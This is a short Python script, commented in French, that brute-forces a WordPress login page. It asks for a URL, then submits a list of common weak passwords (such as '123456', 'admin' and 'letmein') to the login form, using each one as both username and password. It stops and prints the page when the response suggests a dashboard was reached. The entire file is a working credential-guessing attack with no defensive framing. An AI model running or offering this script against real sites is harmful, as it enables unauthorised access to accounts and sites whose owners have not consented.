import requests

# Définir l'URL de la page de login WordPress
url = input("Veuillez entrer une url : ")

# Liste de mots de passe à tester
passwords = [
    "password123", "123456", "letmein", "welcome", "admin",
    "qwerty", "passw0rd", "abc123", "1q2w3e4r", "trustno1",
    "superman", "batman", "iloveyou","admin", "1234", "password1"
]

for password in passwords:
    # Créer les données du formulaire à envoyer
    data = {
        'log': password,
        'pwd': password,
        'wp-submit': 'Log In',
        'redirect_to': '/wordpress/wp-admin/',
        'testcookie': '1'
    }

    # Envoyer la requête POST au formulaire de login
    response = requests.post(url, data=data)

    # Vérifier si la connexion est réussie
    if "Dashboard" in response.text or "wp-admin" in response.url:
        print(f"Reponse : {response.text}")
        print(f"Connexion réussie avec login : {password}, pwd : {password}")
        break
    else:
        print(f"echec avec login : {password}, pwd : {password}")
